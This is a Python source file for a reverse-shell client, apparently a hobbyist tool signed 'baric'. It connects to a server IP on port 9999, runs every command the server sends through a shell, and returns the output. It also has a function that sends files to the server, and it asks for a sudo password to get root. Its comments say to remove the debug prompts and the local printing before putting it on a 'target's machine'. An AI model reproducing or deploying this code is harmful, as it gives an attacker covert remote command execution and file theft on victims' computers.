#targets computer
#connects to server
#by baric

import os
import socket
import subprocess
from os import system, chdir

#when user starts the program if not in root will prompt for root password
#only on unix systems
def promptSudo():
    ret = 0
    if os.geteuid() != 0:
        message = "[sudo] password for %u:"
        ret = subprocess.check_call("sudo -v -p '%s'" %message, shell=True)      
    return ret    

s = socket.socket()
#this needs to be the servers ip address
host = "127.0.0.1"
port = 9999

#prompt sudo 
if promptSudo() != 0:
    print("\nThis program works better in root\n")
    
#just for debugging take out when you put on target machine    
#==========================================================
#ask if right ip
print("press['y' or 'Y'] for yes")
print("press['n' or 'N'] for no")
userChoice = input("is this your server ip: " + host + "\n")

#change ip
if userChoice == "n" or userChoice == "N":
    ip = input("Please enter a ip\n")
    host = ip
    print("new ip is " + host)
#==========================================================    

def sendFileToServer(fileName):
    with open(fileName, "rb") as file:
        for data in file:
            s.sendall(data)
        s.send(b'hmmn')    
    
#binds host and port
s.connect((host, port))

#infinit loop will termate when the server terminates
while True:
    #takes recived data
    data = s.recv(1024)
    print("data = " + str(data))
    #check if the first two letters are cd
    #if so changes the dir to where you want
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))   
          
   
        
    if len(data) > 0:
        #for standard output if anything happens will print to server
        cmd = subprocess.Popen(data[:].decode("utf-8"),
                                shell = True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)      
        #byte code output  
        outputBytes =  cmd.stdout.read() + cmd.stderr.read()
        #string output
        outputStr = str(outputBytes, "utf-8")
        #send byte code to server
        s.send(str.encode(outputStr + str(os.getcwd()) + "> "))
        
        #take out before putting on targets machine
        #prints out on targets machine
        #==============================
        print(outputStr)
        #==============================
    
 
#close socket        
s.close()  

